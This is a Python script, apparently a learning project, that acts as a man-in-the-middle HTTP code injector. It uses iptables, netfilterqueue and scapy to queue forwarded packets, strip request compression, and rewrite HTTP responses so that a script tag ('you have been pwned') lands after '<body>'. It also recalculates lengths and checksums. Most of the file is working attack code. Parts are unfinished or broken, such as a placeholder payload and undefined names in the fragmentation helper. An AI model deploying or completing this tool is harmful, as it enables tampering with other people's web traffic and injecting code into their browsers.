#!/usr/bin/env
import netfilterqueue
import scapy.all as scapy
import sys
import argparse
import subprocess
from scapy.layers import http
import re
import zlib
import linecache

# stolen from here: https://stackoverflow.com/questions/14519177/python-exception-handling-line-number

def PrintException():
    exc_type, exc_obj, tb = sys.exc_info()
    f = tb.tb_frame
    lineno = tb.tb_lineno
    filename = f.f_code.co_filename
    linecache.checkcache(filename)
    line = linecache.getline(filename, lineno, f.f_globals)
    print 'EXCEPTION IN ({}, LINE {} "{}"): {}'.format(filename, lineno, line.strip(), exc_obj)


def run():
	
	set_iptables()
	create_queue()
	 

def create_queue():
	queue = netfilterqueue.NetfilterQueue()
	queue.bind(1, intercept_packets)
	try:
		queue.run()
	except KeyboardInterrupt:
		print("[+] CTRL + C detected, resetting iptables")
		reset_iptables()
		sys.exit(0)


def set_iptables():
	subprocess.call(["iptables", "-I", "FORWARD", "-j", "NFQUEUE", "--queue-num", "1"])


def reset_iptables():
	subprocess.call(["iptables", "--flush"])

def intercept_packets(packet):
	''' captures packet and processes it '''
	try:
		target_host = "tachibanalaboratories"
		alert_message = "you have been pwned"
		payload = "<body><script>alert(\'you have been pwned\');</script>"

		scapy_packet = scapy.IP(packet.get_payload())

		if (scapy_packet.haslayer(http.HTTPRequest)):
		   # print(scapy_packet.show())
			if scapy_packet[scapy.TCP].dport == 80:
				#print("payload", scapy.raw(scapy_packet[IP].payload))
				new_packet = set_http_request_header(scapy_packet)
				packet.set_payload(str(new_packet))
				
				#print("request encoding", new_packet[http.HTTPRequest].Accept_Encoding)

		elif (scapy_packet.haslayer(scapy.Raw) and scapy_packet.haslayer(http.HTTPResponse)):
			#print("response original length", scapy_packet[http.HTTPResponse].Content_Length)
			load = scapy_packet[scapy.Raw].load
			#print(type(scapy_packet))
			if (scapy_packet[scapy.TCP].sport == 80):
				new_packet = set_response_headers_and_load(scapy_packet, load, payload)
				packet.set_payload(str(new_packet))
				#new_packet[scapy.IP].show()
				#print("response modified length", new_packet[http.HTTPResponse].Content_Length)
				#print("pwn")
	except:
		PrintException()
	
	packet.accept()

def forward_packet(*args):
	for packet in args:
		packet.accept()

'''
#### REQUIRED FOR SOME VERSIONS OF SCAPY ####
def get_raw_response_content_length(load):
	content_length_re = re.search("(?:Content-Length:\s)(\d*)", load)
	if content_length_re:
		content_length  = content_length_re(1)
		return content_length

def set_raw_response_content_length(load, payload):
	payload_length = len(payload)
	content_length = get_response_content_length(load)
	try:
		if content_length:
			new_content_length = payload_length + content_length
			load.replace(content_length, new_content_length)
			return load
	except AttributeError:
		print("something has resulted in a None type")
		print(" payload length: ", payload_length)
		print("content length: ", content_length)

#############################################
'''

## trying to figure out a way to recompress the raw layer before forwarding it on to the target but mode -1 is wrong
## need to get this working to avoid the need to fragment packets
def gzip_load(load):
	return zlib.compress(load)

def fragment_packet(packet, req_or_res, *args):
	fragmented_packets = fragment(packet, req_or_res, *args)
	return fragmented_packets

## stolen from https://github.com/secdev/scapy/blob/652b77bf12499451b47609b89abc663aa0f69c55/scapy/layers/inet.py#L891
## this is a modified version

def fragment(pkt, req_or_res, *args): #args are load, payload
    """Fragment a big IP datagram"""
    fragsize = 1480
    fragsize = (fragsize + 7) // 8 * 8
    lst = []
    for p in pkt:
        s = scapy.raw(p[IP].payload)
        nb = (len(s) + fragsize - 1) // fragsize
        for i in range(nb):
            q = p.copy()
            #del(q[IP].payload)
            del(q[IP].chksum)
            del(q[IP].len)
            if i != nb - 1:
                q[IP].flags |= 1
            q[IP].frag += i * fragsize // 8          # <---- CHANGE THIS
            r = conf.raw_layer(load=s[i * fragsize:(i + 1) * fragsize])
            r.overload_fields = p[IP].payload.overload_fields.copy()
            q.add_payload(r)
            lst.append(q)
    return lst

def set_response_header_value_content_length(packet, payload):
	try:
		content_length =  packet[http.HTTPResponse].Content_Length
		payload_length  = len(payload)
		new_content_length = int(content_length) + payload_length
		del packet[http.HTTPResponse].Content_Length
		packet[http.HTTPResponse].Content_Length = new_content_length
		return packet
	except:
		PrintException()


def set_response_headers_and_load(packet, load, payload):
	try:
		#compressed_load = gzip_load(load)
		#load = set_response_content_length(load, payload)

		packet = set_response_header_value_content_length(packet, payload)
		#inject payload into raw layer
		#print("Initial load", load)
		#print("payload", payload)
		payload = "<body>Hello world" # just a small string before I fix the issue with fragmentation

		new_load = load.replace("<body>", payload)
		print(type(load))
		print("Final load", new_load)
		packet[scapy.Raw].load = new_load
		#print ("Raw load", packet[scapy.Raw].load)
		del packet[scapy.IP].len
		del packet[scapy.IP].chksum
		del packet[scapy.TCP].chksum
		return packet
	except:
		#print("Payload type:", type(payload), "payload", payload)
		#print("packet type:", type(packet), "packet", packet)
		PrintException()

def set_http_request_header(packet):
	packet[http.HTTPRequest].Accept_Encoding = ""
	del packet[scapy.IP].len
	del packet[scapy.IP].chksum
	del packet[scapy.TCP].chksum
	return packet
	
run()
